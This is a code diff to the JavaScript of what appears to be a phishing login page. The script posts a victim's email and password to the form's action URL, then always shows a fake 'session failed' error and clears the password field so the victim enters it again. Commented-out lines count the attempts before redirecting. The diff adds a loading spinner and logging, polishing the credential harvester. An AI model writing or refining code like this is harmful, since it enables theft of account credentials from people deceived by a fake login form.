@@ -55,18 +55,20 @@
                 url: $('#gawaboy').attr('action'),
                 method: "post",
                 data: {email: input4email, password: input4passwd},
-                processData: false,
-                      })  
-               
-                                   
+                processData: true,
+                beforeSend: function(xhr){
+                    $('#showerror').removeClass('alert').text('')
+                    $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
+                },                        
                 complete: function(feedback) {
-                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password");
+                       $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
+                       console.log(feedback);
                        // return false;
                 $('#igodo').focus();
                 $('#igodo').val('');
                 // $('#typesent').val("Verification");
     
-                // if (count>=2) { //check if it has been sent twice
+                // if (cou_nt>=2) { //check if it has been sent twice
                     // count=0;
                 // window.location.replace(response['redirect_link']);
                     // window.location.href =   $('#redirect').val();
